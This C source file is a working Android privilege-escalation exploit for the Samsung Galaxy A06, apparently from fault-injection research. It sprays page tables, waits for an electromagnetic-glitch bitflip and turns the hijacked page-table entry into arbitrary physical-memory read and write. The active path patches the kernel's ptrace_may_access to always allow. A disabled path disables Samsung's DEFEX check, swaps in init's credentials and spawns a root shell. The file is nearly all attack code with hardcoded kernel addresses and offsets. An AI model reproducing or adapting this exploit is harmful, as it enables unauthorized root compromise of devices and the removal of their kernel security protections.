/*

Android/aarch64 port of linux_x86_64_lpe.c — Galaxy A06 (MT6768, MediaTek Helio G85).

Same idea as the x86_64 version: spray a huge tower of pagetables via a
memfd-backed shared mapping, wait for the EMFI rig to flip a bit during a
PTE walk, then use the resulting hijacked PTE as an arbitrary physmem r/w
primitive.

This file stops at the physmem-scan step so we can validate the primitive
without doing the actual su patch yet.

Built freestanding with linux_syscall_support.h — no libc.

*/

#define SYS_INLINE_SYSCALL 1
static int my_errno;
#define SYS_ERRNO my_errno
#include "linux_syscall_support.h"

typedef unsigned long      uint64_t;
typedef long               int64_t;
typedef unsigned int       uint32_t;
typedef unsigned char      uint8_t;
typedef unsigned long      uintptr_t;
typedef unsigned long      size_t;
typedef long               ssize_t;
typedef long               off_t;
typedef long               intptr_t;

#define PROT_READ              0x1
#define PROT_WRITE             0x2
#define MAP_SHARED             0x01
#define MAP_FIXED_NOREPLACE 0x100000
#define MAP_FAILED          ((void *)-1)
#define MFD_CLOEXEC          0x0001
#define SEEK_SET                  0

#define STDOUT 1
#define STDERR 2

#define __NR_memfd_create 279

/* ---------- Galaxy A06 specifics ----------
   MT6768 device tree: memory { reg = <0 0x40000000 0 ...>; }
   So DRAM physical base is 0x40000000. Device has ~4 GiB.

   Android arm64 here uses 39-bit user VA (max 0x8000000000 = 512 GiB).
   Theoretical pagetable spray cap on 39-bit VA: ~1 GiB of L3 PT pages
   (each 4K PT covers 2 MiB of virtual; 512 GiB / 2 MiB * 4K = ~1 GiB).
   We spray up to ~480 GiB virtual → ~960 MiB of L3 pagetables, leaving
   ~32 GiB of VA headroom for the stack at the top of user space.
*/
#define TWO_MB         0x200000UL
#define MEMFD_SIZE     (TWO_MB * 16)            /* 32 MiB */
#define PT_SPRAY_COUNT 0x3c00UL                 /* 15360 → 480 GiB virtual → ~960 MiB PTs */
#define TLB_FLUSH_ITERS 2048                    /* must be <= PT_SPRAY_COUNT */
#define SPRAY_BASE     0x100000000UL            /* 4 GiB, 2 MiB-aligned; spray ends at ~472 GiB */
#define PHYS_MEM_BASE  0x40000000UL             /* MT6768 DRAM base */
#define PHYS_MEM_END   0x140000000UL            /* +4 GiB; A06 has ~3.6 GiB usable */

/* ---------- syscall + io helpers ---------- */

static int sys_memfd_create(const char *name, unsigned int flags) {
    register long x8 __asm__("x8") = __NR_memfd_create;
    register long x0 __asm__("x0") = (long)(uintptr_t)name;
    register long x1 __asm__("x1") = (long)flags;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x8), "r"(x1)
                     : "memory", "cc");
    return (int)x0;
}

static size_t str_len(const char *s) {
    size_t n = 0;
    while (s[n]) n++;
    return n;
}

static void p_str(const char *s) {
    sys_write(STDOUT, s, str_len(s));
}

static void p_hex(uint64_t v, int digits) {
    char buf[16];
    static const char hex[] = "0123456789abcdef";
    for (int i = digits - 1; i >= 0; i--) {
        buf[i] = hex[v & 0xf];
        v >>= 4;
    }
    sys_write(STDOUT, buf, digits);
}

static void p_hex64(uint64_t v) { p_str("0x"); p_hex(v, 16); }
static void p_nl(void)          { p_str("\n"); }

__attribute__((unused))
static void p_dec(uint64_t v, int digits) {
    char buf[20];
    for (int i = digits - 1; i >= 0; i--) {
        buf[i] = '0' + (v % 10);
        v /= 10;
    }
    sys_write(STDOUT, buf, digits);
}

static void die(const char *msg) {
    sys_write(STDERR, msg, str_len(msg));
    sys_write(STDERR, " errno=", 7);
    {
        char buf[8];
        static const char hex[] = "0123456789abcdef";
        uint32_t e = (uint32_t)my_errno;
        for (int i = 7; i >= 0; i--) { buf[i] = hex[e & 0xf]; e >>= 4; }
        sys_write(STDERR, buf, 8);
    }
    sys_write(STDERR, "\n", 1);
    sys_exit_group(1);
    __builtin_unreachable();
}

/* ---------- exploit ---------- */

static volatile uint64_t * volatile glitched_pte = NULL;

static uint64_t *find_glitched_pte(void) {
    p_str("[*] Searching for bitflipped PTEs\n");
    /* this is when the EMFI rig should start firing */
    for (;;) {
        sys_write(STDOUT, ".", 1);
        for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
            for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
                uint64_t *ptr = (uint64_t *)(SPRAY_BASE + i * MEMFD_SIZE + j);
                if (*ptr != 0x4141414141414141UL) {
                    p_str("\nFAULT!\n");
                    /* aarch64 leaf PTE: bit 0 valid, bit 1 page, bit 10 AF */
                    if ((*ptr & 0x403UL) != 0x403UL) {
                        continue;
                    }
                    /* sparse pagetable page heuristic: rest of the page zero */
                    int success = 1;
                    for (size_t k = 1; k < 0x1000 / 8; k++) {
                        if (ptr[k]) { success = 0; break; }
                    }
                    if (success) {
                        return ptr;
                    }
                }
            }
        }
    }
}

static void flush_tlb(void) {
    /* read from many distinct pages to evict our cached translation */
    for (size_t i = 0; i < TLB_FLUSH_ITERS; i++) {
        volatile uint64_t * volatile ptr = (uint64_t *)(SPRAY_BASE + i * MEMFD_SIZE);
        (void)*glitched_pte;   /* keep glitched_pte hot in the cache */
        (void)*ptr;
    }
}

/* aarch64 PTE: OA in bits[47:12]. Preserve everything else. */
#define PTE_OA_MASK    0x0000fffffffff000UL
#define PTE_ATTRS_MASK (~PTE_OA_MASK)

/* ---------- LPE: defang DEFEX, swap our cred for init's ----------
   Fixed kernel-image PAs (the kernel image is loaded at a constant PA in
   DRAM; KASLR randomizes virtual addresses, not physical placement):
     init_task           PA 0x41f4d2c0
     task_defex_enforce  PA 0x40270330
   BTF-derived task_struct offsets (KASLR-invariant — struct layout is fixed
   by the kernel build):
     tasks      @ +0x550
     pid        @ +0x618
     parent     @ +0x630
     real_cred  @ +0x818
     cred       @ +0x820
   Linear-map VA -> PA (where slab-allocated task_structs live):
     pa = linear_va - LINEAR_OFFSET
   with LINEAR_OFFSET = PAGE_OFFSET - memstart_addr
                     = 0xffffff8000000000 - 0x40000000
                     = 0xffffff7fc0000000
   Both terms are static: PAGE_OFFSET is a compile-time kernel constant for
   VA_BITS=40, memstart_addr is the device's DRAM start (hardware-fixed).
   Kernel-image VA -> PA is KASLR-randomized; we don't need it because every
   kernel-image symbol we touch (init_task, task_defex_enforce) is reached
   via a hardcoded PA. We do recover init_task's VA at runtime (from its
   self-referential .parent pointer) so we can detect the list head when
   walking task_struct.tasks.
*/
#define INIT_TASK_PA          0x41f4d2c0UL
#define DEFEX_ENFORCE_PA      0x40270330UL
#define PTRACE_MAY_ACCESS_PA  0x40183874UL
#define TS_TASKS_OFF          0x550
#define TS_PID_OFF            0x618
#define TS_PARENT_OFF         0x630
#define TS_REAL_CRED_OFF      0x818
#define TS_CRED_OFF           0x820
#define LINEAR_OFFSET         0xffffff7fc0000000UL
#define LINEAR_VA_TO_PA(v)    ((v) - LINEAR_OFFSET)

/* aarch64 "mov w0, wzr ; ret" — return 0 unconditionally (used by the
   defex bypass below). "mov w0, #1 ; ret" is the same shape but returns
   true (used to neuter ptrace_may_access, which returns bool). Neither
   target needs a BTI landing pad: both are reached via direct `bl` only
   (no callers store their address as data), and our stubs don't touch
   LR so PAC isn't needed either. */
#define INSN_MOV_W0_0         0x52800000U
#define INSN_MOV_W0_1         0x52800020U
#define INSN_RET              0xd65f03c0U

static volatile uint8_t *KMAP;        /* set to glitched_map before any kread/kwrite */
static uint64_t          KORIG_PTE;   /* attribute bits of glitched_pte */

static void kpoint(uint64_t pa) {
    *glitched_pte = (KORIG_PTE & PTE_ATTRS_MASK) | (pa & PTE_OA_MASK);
    flush_tlb();
}

/* PA-keyed primitives. Callers compute PA themselves: hardcoded for
   kernel-image symbols (INIT_TASK_PA, DEFEX_ENFORCE_PA), or via
   LINEAR_VA_TO_PA() for slab-allocated task_struct VAs. */
static uint64_t kread64_pa(uint64_t pa) {
    kpoint(pa & ~0xfffUL);
    return *(volatile uint64_t *)(KMAP + (pa & 0xfff));
}

static uint32_t kread32_pa(uint64_t pa) {
    kpoint(pa & ~0xfffUL);
    return *(volatile uint32_t *)(KMAP + (pa & 0xfff));
}

static void kwrite64_pa(uint64_t pa, uint64_t v) {
    kpoint(pa & ~0xfffUL);
    *(volatile uint64_t *)(KMAP + (pa & 0xfff)) = v;
    __asm__ volatile("dmb ish" ::: "memory");
}

static void disable_defex(void) {
    /* Replace the prologue of task_defex_enforce with `mov w0, wzr ; ret`,
       so every DEFEX check returns "allow". Without this, exec'ing
       /system/bin/sh as uid=0 from a non-trusted path is killed by
       Samsung's DEFEX immutable_root check. */
    p_str("[*] patching task_defex_enforce -> mov w0, wzr ; ret\n");
    uint64_t pa      = DEFEX_ENFORCE_PA;
    uint64_t page_pa = pa & ~0xfffUL;
    size_t   off     = pa & 0xfff;

    kpoint(page_pa);
    *(volatile uint32_t *)(KMAP + off + 0) = INSN_MOV_W0_0;
    *(volatile uint32_t *)(KMAP + off + 4) = INSN_RET;
    __asm__ volatile("dsb ish" ::: "memory");

    /* publish the new instructions to PoU + invalidate I-cache. user-VA
       cache ops are by-VA but resolve to PA, so they cover the kernel's
       own mapping of these bytes. Cortex-A55/A75 D/I cache line = 64 B. */
    uintptr_t va_start = (uintptr_t)(KMAP + off);
    uintptr_t va_end   = va_start + 8;
    uintptr_t line     = va_start & ~63UL;
    for (uintptr_t a = line; a < va_end; a += 64)
        __asm__ volatile("dc cvau, %0" :: "r"(a) : "memory");
    __asm__ volatile("dsb ish" ::: "memory");
    for (uintptr_t a = line; a < va_end; a += 64)
        __asm__ volatile("ic ivau, %0" :: "r"(a) : "memory");
    __asm__ volatile("dsb ish; isb" ::: "memory");
}

/* Patch ptrace_may_access to "mov w0, #1 ; ret" so it always allows.
   Bypasses uid match, CAP_SYS_PTRACE check, dumpable check, and the
   SELinux ptrace hook in one swoop. Reading another process's
   /proc/<pid>/maps and pwritev'ing to /proc/<pid>/mem (or via
   process_vm_writev / preadv with iovec offsets, which call the same
   mm_access path) all unblock. uid stays the same so DEFEX PED never
   fires — no defex bypass needed. */
static void patch_ptrace_may_access(void) {
    p_str("[*] patching ptrace_may_access -> mov w0, #1 ; ret\n");
    uint64_t pa      = PTRACE_MAY_ACCESS_PA;
    uint64_t page_pa = pa & ~0xfffUL;
    size_t   off     = pa & 0xfff;

    kpoint(page_pa);
    *(volatile uint32_t *)(KMAP + off + 0) = INSN_MOV_W0_1;
    *(volatile uint32_t *)(KMAP + off + 4) = INSN_RET;
    __asm__ volatile("dsb ish" ::: "memory");

    uintptr_t va_start = (uintptr_t)(KMAP + off);
    uintptr_t va_end   = va_start + 8;
    uintptr_t line     = va_start & ~63UL;
    for (uintptr_t a = line; a < va_end; a += 64)
        __asm__ volatile("dc cvau, %0" :: "r"(a) : "memory");
    __asm__ volatile("dsb ish" ::: "memory");
    for (uintptr_t a = line; a < va_end; a += 64)
        __asm__ volatile("ic ivau, %0" :: "r"(a) : "memory");
    __asm__ volatile("dsb ish; isb" ::: "memory");
}

/* Block forever via nanosleep so the patch stays installed and the
   exploit process is still around to be inspected. Loop in case
   nanosleep returns early on a signal. Inlined raw svc to avoid pulling
   in any extra LSS dependency. */
static void sleep_forever(void) {
    struct { long tv_sec; long tv_nsec; } ts;
    ts.tv_sec  = 3600;
    ts.tv_nsec = 0;
    for (;;) {
        register long x8 __asm__("x8") = 101;          /* __NR_nanosleep */
        register long x0 __asm__("x0") = (long)(uintptr_t)&ts;
        register long x1 __asm__("x1") = 0;
        __asm__ volatile("svc #0"
                         : "+r"(x0)
                         : "r"(x8), "r"(x1)
                         : "memory", "cc");
    }
}

static void do_ptrace_patch_only(uint64_t orig_pte, uint8_t *glitched_map) {
    KMAP      = glitched_map;
    KORIG_PTE = orig_pte;

    patch_ptrace_may_access();

    /* restore the original PTE — the glitched mapping is no longer needed. */
    *glitched_pte = orig_pte;

    p_str("[+] patched. process pid=");
    p_hex(sys_getpid(), 8);
    p_str(", sleeping forever.\n");
    sleep_forever();
}

__attribute__((unused))
static void do_lpe(uint64_t orig_pte, uint8_t *glitched_map) {
    KMAP      = glitched_map;
    KORIG_PTE = orig_pte;

    /* Sanity-check that the hardcoded PA actually lands on init_task. */
    if (kread32_pa(INIT_TASK_PA + TS_PID_OFF) != 0)
        die("init_task signature mismatch (pid != 0 at INIT_TASK_PA)");

    disable_defex();

    int my_pid = sys_getpid();
    p_str("[*] my pid = ");
    p_hex(my_pid, 8);
    p_nl();

    /* Recover init_task's (KASLR-randomized) VA from its self-referential
       .parent pointer. We need this so we can spot the list head while
       walking — the only kernel-image VA we'll see in the chain. */
    uint64_t init_task_va = kread64_pa(INIT_TASK_PA + TS_PARENT_OFF);
    uint64_t head_va      = init_task_va + TS_TASKS_OFF;
    p_str("[*] init_task_va = ");
    p_hex64(init_task_va);
    p_nl();

    uint64_t my_task_pa   = 0;
    uint64_t init_cred_va = 0;

    p_str("[*] walking task list from init_task...\n");
    uint64_t cur = kread64_pa(INIT_TASK_PA + TS_TASKS_OFF);
    int n = 0;
    while (cur != head_va && n < 4096) {
        /* Every task_struct after init_task is slab-allocated, so its VA
           is in the linear map — not the kernel image. */
        uint64_t task_va = cur - TS_TASKS_OFF;
        uint64_t task_pa = LINEAR_VA_TO_PA(task_va);
        uint32_t pid     = kread32_pa(task_pa + TS_PID_OFF);

        p_str("  [");
        p_hex(n, 4);
        p_str("] task_va=");
        p_hex64(task_va);
        p_str(" pid=");
        p_hex(pid, 8);
        p_nl();

        if (pid == 1) {
            init_cred_va = kread64_pa(task_pa + TS_CRED_OFF);
            p_str("  [+] pid 1 (init) cred=");
            p_hex64(init_cred_va);
            p_nl();
        }
        if (pid == (uint32_t)my_pid) {
            my_task_pa = task_pa;
            p_str("  [+] our task\n");
        }
        if (init_cred_va && my_task_pa) break;

        cur = kread64_pa(task_pa + TS_TASKS_OFF);  /* tasks.next */
        n++;
    }

    if (!init_cred_va) die("init's cred not found");
    if (!my_task_pa)   die("our task_struct not found");

    p_str("[*] swapping cred + real_cred...\n");
    kwrite64_pa(my_task_pa + TS_REAL_CRED_OFF, init_cred_va);
    kwrite64_pa(my_task_pa + TS_CRED_OFF,      init_cred_va);

    /* restore the original PTE — the glitched mapping is no longer needed. */
    *glitched_pte = orig_pte;

    p_str("[+] swapped. ");
    uint32_t r, e, s;
    sys_getresuid((uid_t *)&r, (uid_t *)&e, (uid_t *)&s);
    p_str("ruid="); p_hex(r, 8);
    p_str(" euid="); p_hex(e, 8);
    p_str(" suid="); p_hex(s, 8);
    p_nl();

    p_str("[+] exec'ing /system/bin/sh\n");
    const char *const argv[] = { "/system/bin/sh", 0 };
    const char *const envp[] = { 0 };
    sys_execve("/system/bin/sh", argv, envp);
    die("execve failed");
}

void _start(void) {
    p_str("[*] Setting up memfd\n");
    int memfd = sys_memfd_create("hax", MFD_CLOEXEC);
    if (memfd < 0) die("memfd_create failed");

    if (sys_ftruncate(memfd, MEMFD_SIZE) != 0) die("ftruncate failed");

    /* populate the memfd with recognizable values */
    for (size_t i = 0; i < MEMFD_SIZE; i += TWO_MB) {
        if (sys_lseek(memfd, (off_t)i, SEEK_SET) < 0) die("lseek failed");
        if (sys_write(memfd, "AAAAAAAA", 8) != 8) die("write failed");
    }

    p_str("[*] Spraying pagetables\n");
    for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
        uint8_t *want = (uint8_t *)(SPRAY_BASE + i * MEMFD_SIZE);
        uint8_t *got  = sys_mmap(want, MEMFD_SIZE,
                                 PROT_READ | PROT_WRITE,
                                 MAP_SHARED | MAP_FIXED_NOREPLACE,
                                 memfd, 0);
        if (got != want) {
            p_str("[-] spray mmap failed at i=");
            p_hex(i, 8);
            p_nl();
            die("mmap");
        }
    }

    /* on success, glitched_pte was glitched during a DRAM read.
       the actual PTE value in DRAM is unmodified.
       therefore it must not fall out of cache until the exploit is done.
       we'll re-read it periodically — volatile so the compiler doesn't elide. */
    glitched_pte = find_glitched_pte();
    p_str("[+] Found glitched PTE @ ");
    p_hex64((uint64_t)(uintptr_t)glitched_pte);
    p_nl();
    p_str("[*] PTE value: ");
    p_hex64(*glitched_pte);
    p_nl();
    p_str("[*] Searching for corresponding mapping...\n");

    uint64_t orig_pte = *glitched_pte;
    /* point the glitched PTE at PHYS_MEM_BASE so the corresponding mapping
       reads something other than 'AAAAAAAA' (DRAM start is unlikely to
       contain that pattern). preserve attribute bits. */
    *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (PHYS_MEM_BASE & PTE_OA_MASK);

    uint8_t *glitched_map = NULL;
    flush_tlb();

    for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
        for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
            uint64_t *ptr = (uint64_t *)(SPRAY_BASE + i * MEMFD_SIZE + j);
            if (ptr == (uint64_t *)glitched_pte) continue;
            /* dual purpose: keep glitched_pte hot AND check we're not seeing
               the value we just wrote leak through the memfd path */
            if (*ptr == *glitched_pte) {
                p_str("[-] That's not supposed to happen\n");
                sys_exit_group(1);
                __builtin_unreachable();
            }
            if (*ptr != 0x4141414141414141UL) {
                p_str("Found it! @ ");
                p_hex64((uint64_t)(uintptr_t)ptr);
                p_nl();
                glitched_map = (uint8_t *)ptr;
            }
        }
    }

    if (!glitched_map) {
        p_str("[-] Failed to find corresponding mapping :(\n");
        sys_exit_group(1);
        __builtin_unreachable();
    }

    p_str("[+] Found the mapping @ ");
    p_hex64((uint64_t)(uintptr_t)glitched_map);
    p_nl();

    /* Cred-swap LPE path is left below for reference but disabled for
       now — we only land the ptrace_may_access patch and stay alive. */
    do_ptrace_patch_only(orig_pte, glitched_map);
    /* do_lpe(orig_pte, glitched_map); */
    __builtin_unreachable();
}
